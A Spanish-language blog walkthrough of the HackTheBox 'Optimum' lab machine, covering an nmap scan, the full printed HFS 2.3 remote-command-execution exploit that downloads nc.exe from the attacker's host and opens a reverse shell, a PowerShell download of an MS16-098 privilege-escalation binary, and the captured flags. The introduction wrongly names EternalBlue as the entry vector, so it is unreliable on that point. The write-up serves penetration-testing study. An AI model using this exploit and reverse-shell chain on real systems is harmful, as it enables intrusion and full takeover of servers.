---
layout: post
title: Optimum - Walkthrough
date: 2020-08-21 20:44
description: EternalOptimum se hace presente para romper esta máquina que da ciertas complicaciones pero es fácil.
toc: true
comments: false
tags: 
 - OSCP
 - Walkthrough
 - HackTheBox

---

## **Walkthrough de Optimum**
---

![img]({{ '/assets/images/Optimum/Optimum_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
Esta máquina es muy parecida a Legacy desde el punto de vista que el vector de ingreso es una vulnerabilidad muy conocida llamada EternalBlue o MS17-010. Usando Metasploit es fácil aunque hay que correr el exploit varias veces hasta que funcione, las cosas se complican un poco para explotarla de forma manual pero después de un par de horas de investigación sale andando.

---

## **Links**
 Optimum en Hack The Box](https://www.hackthebox.eu/home/machines/profile/6)



## **Reconocimiento**
---

>**``nmap -A -T4 -p 80 10.10.10.8 -oA Optimum``**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 20:42 -03
Nmap scan report for 10.10.10.8
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|7|2008|2016|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   240.01 ms 10.10.14.1
2   240.07 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds
```

Solamente un servicio disponible, HTTP. `Nikto` y `Dirb` no sirven de mucho. Al entrar al sitio con un browser e igual que como dice `nmap` existe la aplicación llamada **HttpFileServer 2.3**

---

![img]({{ '/assets/images/Optimum/Optimum_01.png' | relative_url }}){: .center-image }*(HFS)*

---

Una búsqueda rápida en **Searchsploit** revela lo siguiente:

```console
searchsploit hfs 2.3
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                      | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                 | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                 | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                            | windows/webapps/34852.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
```
Por suerte no hay muchas opciones, yo voy por la del script de Python (39161).

```python
import urllib2
import sys

try:
        def script_create():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

        def execute_script():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

        def nc_run():
                urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

        ip_addr = "10.10.14.23" #local IP address
        local_port = "4444" # Local Port number
        vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
        save= "save|" + vbs
        vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
        exe= "exec|"+vbs2
        vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
        exe1= "exec|"+vbs3
        script_create()
        execute_script()
        nc_run()
except:
        print """[.]Something went wrong..!
        Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
        Don't forgot to change the Local IP address and Port number on the script"""
```

Entonces, el script se va a conectar a la máquina atacada, copiar `nc.exe` y generar una conexión reversa al socket que nosotros le configuremos.

1. Modificar el script con la IP y el puerto donde va a estar escuchando nuestro nc.
2. Copiar `nc.exe` a la misma carpeta donde se va a correr el script.
3. Poner a `nc` a escuchar.

Posiblemente haya que correr el exploit un par de veces hasta que funcione pero después de eso tenemos shell reversa para todos.

En este caso **winPEAS** no fue de mucha ayuda. Finalmente el exploit que va a permitir escalar privilegios  es [MS16-098](https://www.exploit-db.com/exploits/41020). Según se detalla, es para Windows 8 pero en la máquina a atacar que es un Windows 2012 también puede funcionar.

No hace falta compilar el exploit, dentro de los comentarios se pasa una [URL](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe) para descargarlo:

Copado, tengo el exploit pero ¿Cómo se copia a la máquina atacada?

Una a favor es que podemos correr **PowerShell** que trae un cmdlet que permite hacer descargas. El comando a ejecutar es el siguiente (previamente se levanta un servidor web en la máquina atacante):

> ``powershell -c Invoke-WebRequest -Uri "http://10.10.14.23:80/41020.exe" -OutFile "privesc.exe"``

```console
C:\Users\kostas\Desktop>privesc.exe
privesc.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```
---

Una vez que se corre se puede ver que el usuario ya es ``System``.


## **Flags**
---

A por los flags!

```console
C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```


---